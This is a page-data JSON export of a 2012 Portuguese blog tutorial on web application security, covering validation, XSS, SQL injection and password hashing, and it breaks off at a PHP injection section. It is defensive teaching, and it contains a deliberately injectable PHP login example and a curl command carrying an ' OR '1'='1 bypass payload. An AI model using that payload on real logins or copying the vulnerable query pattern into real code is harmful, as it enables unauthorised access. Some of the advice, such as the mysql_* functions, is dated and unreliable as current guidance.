{"componentChunkName":"component---src-templates-blog-post-js","path":"/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html","result":{"data":{"markdownRemark":{"html":"<p>Seria perfeito se o mundo fosse feito apenas de pessoas\nbem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem\na raça humana, do que o homem deixar de tirar proveito de alguma\nsituação.</p>\n<p>Quando estamos desenvolvendo nossas aplicações <a href=\"/tag/desenvolvimento-web.html\" title=\"Leia mais sobre Web\"><em>web</em></a>, temos que\n“pensar” como um usuário mal-intencionado. Não somente para garantir o\nbom funcionamento da mesma, mas também para garantir a segurança e\nbem-estar dos “usuários civis” que consomem os nossos serviços.</p>\n<p>Vamos explorar alguns problemas relacionados a segurança, e mostrar como\nsolucioná-los de forma simples e prática.</p>\n<h2>Use frameworks!</h2>\n<p>E esta é a minha primeira dica para você: use <em>frameworks</em> sempre que\npossível!</p>\n<p>Eles já possuem um conjunto de ferramentas que contornam problemas como\n<em>SQL Injection</em>, <em>XSS</em> e <em>CSRF</em>. Pessoas muito inteligentes já pensaram no\nproblema e já solucionaram para você. Na maioria dos casos, mais de uma vez!</p>\n<p>Em alguns <em>frameworks</em>, como o <a href=\"/tag/django.html\" title=\"Leia mais sobre Django\"><em>Django</em></a> e <a href=\"/tag/codeigniter.html\" title=\"Leia mais sobre Codeigniter\"><em>Codeigniter</em></a>, essas\nferramentas são quase “transparentes”, ou seja, você tem pouco (ou\nnenhum) trabalho para utilizá-las no cotidiano.</p>\n<p>Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje\nposso apontar vários pontos de falhas em aplicações que produzi no\npassado. Os <em>frameworks</em> diminuem muito estes pontos, por isso vale a\npena o seu uso.</p>\n<h2>Validações (nunca confie no usuário)</h2>\n<p>Como eu comecei com o <a href=\"/tag/php.html\" title=\"Leia mais sobre PHP\"><em>PHP</em></a>, sei muito bem que este é um problema\ncomum em aplicações desenvolvidas por iniciantes.</p>\n<p><strong>Nunca confie no usuário</strong>, e principalmente <strong>nunca confie em\nvalidações realizadas pelo <a href=\"/tag/javascript.html\" title=\"Leia mais sobre Javascript\"><em>Javascript</em></a></strong>. Todo ponto de entrada de\ninformação deve possuir uma validação no <em>server-side</em>, mesmo que exista\numa validação no <em>client-side</em>. <strong>Lembre-se:</strong> Existem navegadores que\nnão utilizam <em>Javascript</em>, e mesmo os que utilizam, permitem que o\nusuário desabilite esta função.</p>\n<p>No <em>Django</em>, podemos fazer validações de formulários através de\n<a href=\"https://docs.djangoproject.com/en/dev/topics/forms/\" title=\"Conheça os Forms no Django\"><em>Forms</em></a>. No <em>Codeigniter</em> fazemos através da <a href=\"http://codeigniter.com/user_guide/libraries/form_validation.html\" title=\"Veja como fazer validações de formulário no Codeigniter\"><em>Form Validation Class</em></a>.\nEm <em>PHP</em> “puro”, podemos fazer validações através da <a href=\"http://pear.php.net/manual/en/package.validate.validate.intro.php\" title=\"Instale a Validate através da PEAR\">biblioteca <em>Validate</em></a>.</p>\n<p>As ferramentas citadas acima são extremamente eficientes para ações\nrealizadas via <em>POST</em>. Mas e quando temos parâmetros vindos da <em>URL</em>,\natravés do método <em>GET</em>, qual é a melhor maneira de agirmos?</p>\n<h3>URLs seguras e amigáveis</h3>\n<p>Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial\nnas aplicações <em>web</em> e tornaram-se item obrigatório. Além de trazer o\nbenefício do <a href=\"http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca\" title=\"Leia mais sobre SEO no Wikipedia\"><em>SEO</em></a>, elas podem ser uma grande aliada quando o\nassunto é segurança.</p>\n<p><em>URLs</em> que antes eram feitas dessa maneira:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">/blog.php?year=2012&amp;month=12&amp;day=21</code></pre></div>\n<p>Podem ser reproduzidas desta forma:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">/blog/2012/12/21/</code></pre></div>\n<p>O mecanismo de rotas de alguns <em>frameworks</em> permite a utilização de\nexpressões regulares na construção do caminho. Por exemplo, em <em>Django</em>\ntemos o seguinte cenário:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># urls.py</span>\n\nurlpatterns <span class=\"token operator\">=</span> patterns<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">(</span><span class=\"token string\">r'^blog/(?P&lt;year>\\d{4})/(?P&lt;month>[0-9]{2})/(?P&lt;day>\\d{2})/$'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'blog.views.index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">)</span></code></pre></div>\n<p>Determinamos que a rota inicia-se por <code class=\"language-text\">blog</code>, sendo composta por um\nvalor numérico de 4 dígitos que atende pelo identificador <code class=\"language-text\">year</code>,\noutro valor de dois dígitos, indo de 0 a 9, chamado <code class=\"language-text\">month</code>, e o\núltimo um valor numérico de 2 dígitos chamado <code class=\"language-text\">day</code>.</p>\n<p>A verificação é feita no momento da requisição. Se a rota informada\nbater com o padrão criado, ele executa a <em>view</em> <code class=\"language-text\">blog.views</code>. Caso\ncontrário, se a rota não bater com nenhum padrão informado (por exemplo,\n<code class=\"language-text\">/blog/2012/aa/21/</code>), o usuário tomará um erro 404.</p>\n<p>Em nossa <em>view</em>, resgataríamos esses valores da seguinte forma:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># blog/views.py</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> year<span class=\"token punctuation\">,</span> month<span class=\"token punctuation\">,</span> day<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># Lógica de renderização...</span></code></pre></div>\n<p>Simples assim! Temos um “input” de informação através de <em>GET</em>, onde\ntemos certeza do seu tipo e tamanho.</p>\n<p>O mesmo resultado pode ser obtido com o <em>Codeigniter</em>, basta adicionar a\nexpressão desejada em seu <code class=\"language-text\">application/config/routes.php</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token shell-comment comment\"># application/config/routes.php</span>\n\n<span class=\"token variable\">$route</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'blog/(\\d{4})/([0-9]{2})/(\\d{2})'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"blog/index/<span class=\"token interpolation\"><span class=\"token variable\">$1</span></span>/<span class=\"token interpolation\"><span class=\"token variable\">$2</span></span>/<span class=\"token interpolation\"><span class=\"token variable\">$3</span></span>\"</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos\ncriados na expressão regular.</p>\n<p>Você não precisa utilizar um <em>framework</em> para ter um esquema de rotas\ncomo ilustrado acima. Um resultado parecido pode ser atingido através do\n<a href=\"/tag/nginx.html\" title=\"Leia mais sobre Nginx\"><em>Nginx</em></a> e do <em>Apache</em> com <em>mod-rewrite</em>. <a href=\"http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php\" title=\"Como criar rotas para arquivos PHP com o Apache\">Veja um exemplo de uso</a>\napresentado numa <em>thread</em> do <em>Stack Overflow</em>.</p>\n<p>É claro que verificações mais complexas, como por exemplo, se o nome do\nusuário informado na <em>URL</em> é válido, necessitam de regras específicas,\nmuito provavelmente escritas dentro da <em>view</em>. Um ponto de falha que\nvale ressaltar é a criação de expressões regulares “genéricas”, que não\ndiscriminam o tipo e tamanho dos valores informados.</p>\n<h3>Verificação de tipos de dados</h3>\n<p>Mas e quando não temos como fugir de um valor passado via <em>GET</em>? Pode\nacontecer! Por exemplo, em paginações (onde normalmente passamos um\nvalor <code class=\"language-text\">page</code> como parâmetro), ou em uma busca (onde passamos o valor\npesquisado via <em>GET</em>).</p>\n<p>Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas\nde interpretação do nosso código:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token variable\">$page</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/^\\d+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'page'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>A solução acima não é infalível, mas é uma maneira de diminuírmos a\nincidência de erros. Se um valor diferente de inteiro positivo for\npassado, a página a ser exibida será a primeira.</p>\n<h2>XSS – Cross-Site Scripting (não confie na informação)</h2>\n<p>É certo que, validando toda e qualquer\ninformação que a sua aplicação receber, você diminuirá muito a\nocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da\ninformação, não podemos confiar no seu conteúdo.</p>\n<p>Imagine que você possua um <em>blog</em>. Só você pode escrever artigos nele,\nentão você conhece o conteúdo da informação sendo produzida. Certo dia\nvocê resolve que os usuários poderão comentar no seu <em>blog</em>, e\ndesenvolve uma ferramenta de comentários com todas as validações citadas\nanteriormente.</p>\n<p>Até que em certo momento, um usuário mal-intencionado <strong>escreve um\ncomentário</strong> no seu <em>post</em>, e neste comentário existe um <strong><em>script</em></strong>\n<em>Javascript</em> que explora uma <strong>falha de segurança</strong> do <em>ActiveX</em> (por\nexemplo). Logo, todos os leitores que utilizam <em>Internet Explorer</em> e\nleram o seu <em>post</em> são infectados por um <em>malware</em> que o seu <em>blog</em>\najudou a proliferar.</p>\n<p>A injeção de um <em>script</em> em um <em>website</em>, através de campos de textos ou\npassagem de parâmetros, é caracterizado como um ataque de <strong><em>Cross-Site\nScripting</em></strong> (ou <em>XSS</em>).</p>\n<p>Uma maneira muito comum de evitar esse tipo de problema é simplesmente\n“escapando” ou removendo elementos <em>HTML</em> do conteúdo:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token shell-comment comment\"># xss.php</span>\n\n<span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'var'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>Acessar <code class=\"language-text\">xss.php</code> com um <code class=\"language-text\">alert</code> <em>Javascript</em> como parâmetro, não\nexecutará o comando, e sim apenas exibirá o conteúdo na tela, com os\ncaracteres que delimitam o elemento <code class=\"language-text\">script</code> devidamente formatados:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">http://localhost/xss.php?var=&amp;lt;script&amp;gt;alert(&quot;XSS!&quot;);&amp;lt;/script&amp;gt;</code></pre></div>\n<p>Existem alguns <a href=\"http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/\" title=\"Conheça 20 excelentes editores WYSIWYG\"><em>Rich Text Editors</em></a> que verificam e formatam o\nconteúdo do campo antes de uma submissão. Mas <strong>lembre-se</strong>! Editores\n<em>WYSIWYG</em> são basicamente <em>Javascript</em>, logo, se eu desabilitar o\n<em>Javascript</em> do meu navegador, posso enviar <em>scripts</em> maliciosos sem\nimpeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de\nvalidação no <em>server-side</em>.</p>\n<p>O <em>Codeigniter</em>, com a opção <code class=\"language-text\">$config[&#39;global_xss_filtering’]</code> como\n<code class=\"language-text\">TRUE</code>, filtra automaticamente os dados resgatados de <em>GET</em> ou <em>POST</em>.\nO que acho bacana desse filtro, é que ele previne apenas a injeção de\n<em>scripts</em> e atributos que podem de alguma forma prejudicar na segurança\nda sua aplicação, não necessariamente formatando o conteúdo todo.</p>\n<p>Este tratamento está ativo por padrão no <em>engine</em> de <em>templates</em> do\n<em>Django</em>. Embora isso não impeça o armazenamento do <em>script</em> no banco de\ndados, impede que a sua renderização afete os usuários da sua aplicação.</p>\n<p>Uma outra forma muito bacana de prevenir este tipo de inconveniente é\nutilizando uma linguagem de marcação alternativa, como <em>Textile</em> e\n<em>Markdown</em>, em campos de textos abertos.</p>\n<h2>SQL Injection (não confie em sua aplicação)</h2>\n<p>Entre as vulnerabilidades citadas, acredito que o\n<strong><em>SQL Injection</em></strong> é uma das mais\ndestrutivas, tanto para a sua aplicação, quanto para os seus usuários.</p>\n<p>Segundo o <em>Wikipedia</em>:</p>\n<blockquote>\n<p>É um tipo de ameaça de segurança que se aproveita de falhas em\nsistemas que interagem com bases de dados via SQL. A injeção de\nSQL ocorre quando o atacante consegue inserir\numa série de instruções SQL dentro de uma\nconsulta (query) através da manipulação das entrada de dados de uma\naplicação.</p>\n</blockquote>\n<p>Os resultados podem ser os mais desastrosos, como por exemplo, o acesso\nde usuários não autorizados a áreas restritas, e o roubo de informações\nda sua base de dados. Abaixo, uma autenticação simples, utilizando nome\nde usuário e senha:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token shell-comment comment\"># sql-injection.php</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'usuario'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'senha'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$usuario</span>    <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'usuario'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$senha</span>      <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'senha'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Abre conexão com o banco de dados</span>\n    <span class=\"token variable\">$link</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// Seleciona a base de dados</span>\n    <span class=\"token function\">mysql_select_db</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'exemplos_blog'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Faz a consulta ao banco, comparando usuário e senha</span>\n    <span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"SELECT 1 FROM usuario WHERE usuario = '<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$usuario</span><span class=\"token punctuation\">}</span></span>' \"</span>\n        <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"AND senha = '<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$senha</span><span class=\"token punctuation\">}</span></span>'\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Query inválida: \"</span>\n        <span class=\"token punctuation\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">mysql_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Vai para a página logada</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'Login com sucesso'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Errou o usuário e senha, volta para a página de login</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'Usuário e senha inválidos'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Vai para a página de login</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>Levando em consideração que temos um usuário com nome <code class=\"language-text\">teste</code> e senha\n<code class=\"language-text\">teste</code>, se executarmos a instrução abaixo, será exibida uma mensagem\nde <em>login</em> inválido:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ curl --data &quot;usuario=foo&amp;senha=bar&quot; http://localhost/sql-injection.php\n\nUsuário e senha inválidos</code></pre></div>\n<p>Evidente! Este usuário não existe no banco de dados. Mas, podemos\nimaginar que a aplicação não possua proteção contra injeções <em>SQL</em>,\nentão podemos fazer com que a consulta retorne positivo, e que nosso\nacesso seja garantido mesmo não possuindo um usuário no banco de dados.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ curl --data &quot;usuario=foo&amp;senha=bar&#39; OR &#39;1&#39; = &#39;1&quot; http://localhost/sql-injection.php\n\nLogin com sucesso</code></pre></div>\n<p>A nossa <em>query</em>, por não fazermos um tratamento nos campos do\nformulário, foi composta pelo valor <code class=\"language-text\">bar’ OR &#39;1’ = ’1</code>, o que resultou\nno seguinte <em>SQL</em>:</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span> <span class=\"token keyword\">FROM</span> usuario\n<span class=\"token keyword\">WHERE</span> usuario <span class=\"token operator\">=</span> <span class=\"token string\">'foo'</span> <span class=\"token operator\">AND</span> senha <span class=\"token operator\">=</span> <span class=\"token string\">'bar'</span> <span class=\"token operator\">OR</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></code></pre></div>\n<p>Existem algumas soluções para este problema, como o uso de\n<code class=\"language-text\">addslashes</code> no <em>PHP</em>, mas os que fazem mais sentido para mim são:</p>\n<ul>\n<li>O uso da função <code class=\"language-text\">mysql_real_escape_string</code> para formatar dados\nantes de construir a <em>query</em>;</li>\n<li>O uso da classe <code class=\"language-text\">mysqli</code> para consultas a bancos de dados <em>MySQL</em>,\nao invés do uso das funções <em>mysql</em>.</li>\n</ul>\n<p>A primeira é a mais prática de aplicarmos. No código anterior, bastaria\nformatar os valores na hora que são resgatados do <em>array</em> <code class=\"language-text\">$_POST</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$usuario</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysql_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'usuario'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$senha</span>      <span class=\"token operator\">=</span> <span class=\"token function\">mysql_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'senha'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Com o <strong>mysqli</strong>, precisamos fazer algumas alterações no código, como\ndemonstrado abaixo:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token shell-comment comment\"># sql-injection.php (com mysqli)</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'usuario'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'senha'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$usuario</span>    <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'usuario'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$senha</span>      <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'senha'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Abre conexão com o banco de dados</span>\n        <span class=\"token variable\">$mysqli</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">'exemplos_blog'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Faz a consulta ao banco, comparando usuário e senha</span>\n        <span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$mysqli</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"SELECT 1 FROM usuario WHERE usuario = ? \"</span>\n            <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"AND senha = ?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$query</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'ss'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$usuario</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$senha</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$query</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$query</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">store_result</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$num_rows</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$query</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">num_rows</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$query</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$num_rows</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// Vai para a página logada</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'Login com sucesso'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// Errou o usuário e senha, volta para a página de login</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'Usuário e senha inválidos'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Vai para a página de login</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>Mas como o mundo não é feito só de <em>MySQL</em>, se ocorrer de você utilizar\num outro banco de dados, eu recomendo o uso da biblioteca <a href=\"http://php.net/pdo\" title=\"Conheça a lib PDO do PHP\"><em>PDO</em></a>.</p>\n<p>Como o <a href=\"https://docs.djangoproject.com/en/1.4/topics/db/queries/\" title=\"Making queries\"><em>Django</em> utiliza <em>ORM</em></a>, e o <a href=\"http://codeigniter.com/user_guide/database/active_record.html\" title=\"Active Record Class\"><em>Codeigniter</em> tem a <em>Active\nRecord Class</em></a>, nesses <em>frameworks</em> essa validação é feita no momento\nque interagimos com os seus <em>models</em>. Mas é sempre bom ter cuidado!\nPrincipalmente quando o <em>ORM</em> não atende o nosso requisito, e temos que\npartir para consultas <em>SQL</em> puras.</p>\n<h3>Senhas criptografadas</h3>\n<p>Uma boa dica é, sempre que persistirmos um usuário em nossa base de\ndados, armazenarmos a sua senha criptografada em um formato “sem volta”\n(conhecido como <em>hash</em>). Além de ser um princípio ético, que na minha\nopinião todo o desenvolver de aplicações deveria ter, garantimos que\nmesmo que a nossa aplicação seja invadida, as senhas dos usuários\nestarão “seguras”.</p>\n<p>Embora o <a href=\"http://pt.wikipedia.org/wiki/MD5\" title=\"Conheça o algoritmo MD5\"><em>MD5</em></a> e o <a href=\"http://pt.wikipedia.org/wiki/SHA1\" title=\"Conheça o algoritmo SHA1\"><em>SHA1</em></a> sejam as escolhas mais populares, os\ndesenvolvedores do <em>Django</em> <a href=\"https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing\" title=\"Leia a release note do Django 1.4\">recomendam o uso de algoritmos mais sofisticados</a>,\ncomo o <a href=\"http://en.wikipedia.org/wiki/PBKDF2\" title=\"Conheça o algoritmo PBKDF2\"><em>PBKDF2</em></a>, por acreditarem que o poder\ncomputacional atingiu um nível, que senhas <em>MD5</em> e <em>SHA1</em> podem com\nconsiderável esforço ser quebradas.</p>\n<h2>PHP Injection (não confie no PHP)</h2>\n<p>Embora esta técnica possa acontecer em outras linguagens, o <em>PHP</em> dá\nmuita margem para desenvolvedores menos experientes deixarem brechas\npara uma vulnerabilidade conhecida como <strong><em>PHP\nInjection</em></strong>.</p>\n<p>Com o site dividido em seções, é comum termos inclusões de arquivos\n<em>PHP</em> para compor uma página. Para economizar esforço e linhas de\ncódigo, deixamos as partes como menu e topo “estáticas”, e só alteramos\no conteúdo do bloco principal da página. Acontece que em alguns casos, o\ndesenvolvedor espera que um determinado arquivo seja importado de acordo\ncom a <em>URL</em> que o internauta está visitando. Por exemplo:</p>\n<div class=\"gatsby-highlight\" 